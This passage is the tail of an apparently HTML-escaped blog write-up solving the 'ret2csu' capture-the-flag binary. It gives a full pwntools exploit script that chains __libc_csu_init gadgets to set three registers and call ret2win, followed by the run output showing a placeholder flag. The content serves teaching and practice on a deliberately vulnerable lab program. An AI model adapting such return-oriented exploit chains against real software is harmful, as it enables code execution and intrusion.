&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">pop rbx ; 0
&lt;/span>&lt;span style="color:#e6db74">pop rbp ; 1
&lt;/span>&lt;span style="color:#e6db74">pop r12 ; 0x4003af+1
&lt;/span>&lt;span style="color:#e6db74">pop r13
&lt;/span>&lt;span style="color:#e6db74">pop r14 ; 0xcafebabecafebabe
&lt;/span>&lt;span style="color:#e6db74">pop r15 ; 0xd00df00dd00df00d
&lt;/span>&lt;span style="color:#e6db74">ret ; ret2csu_rdx
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2csu_set &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00400680&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">mov rdx, r15
&lt;/span>&lt;span style="color:#e6db74">mov rsi, r14
&lt;/span>&lt;span style="color:#e6db74">mov edi, r13d
&lt;/span>&lt;span style="color:#e6db74">call qword [r12 + rbx*8]
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2csu_rdx &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0040069a&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">pop rdi ; 0xdeadbeefdeadbeef
&lt;/span>&lt;span style="color:#e6db74">ret ; ret2win
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
pop_rdi &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x004006a3&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">jmp qword [reloc.ret2win]
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
ret2win &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00400510&lt;/span>
elf &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
rop &lt;span style="color:#f92672">=&lt;/span> ROP(elf)
&lt;span style="color:#75715e"># ret2csu_set&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2csu_rdx)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#75715e"># pop rbp&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0x4003af&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xcafebabecafebabe&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xd00df00dd00df00d&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
&lt;span style="color:#75715e"># ret2csu_rdx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2csu_set)
&lt;span style="color:#75715e"># pop_rdi&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># stack alignment&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbx&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop rbp&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r12&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r13&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r14&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#75715e"># pop r15&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(pop_rdi)
rop&lt;span style="color:#f92672">.&lt;/span>raw(&lt;span style="color:#ae81ff">0xdeadbeefdeadbeef&lt;/span>) &lt;span style="color:#75715e"># pop rdi&lt;/span>
&lt;span style="color:#75715e"># ret2win&lt;/span>
rop&lt;span style="color:#f92672">.&lt;/span>raw(ret2win)
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./ret2csu&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span> &lt;span style="color:#f92672">+&lt;/span> rop&lt;span style="color:#f92672">.&lt;/span>chain())
r&lt;span style="color:#f92672">.&lt;/span>readline()
log&lt;span style="color:#f92672">.&lt;/span>success(&lt;span style="color:#e6db74">&amp;#39;Flag: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>))
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action.&lt;/p>
&lt;pre>&lt;code>./exploit.py
[*] './ret2csu'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
RUNPATH: b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
&lt;/code>&lt;/pre></content></item></channel></rss>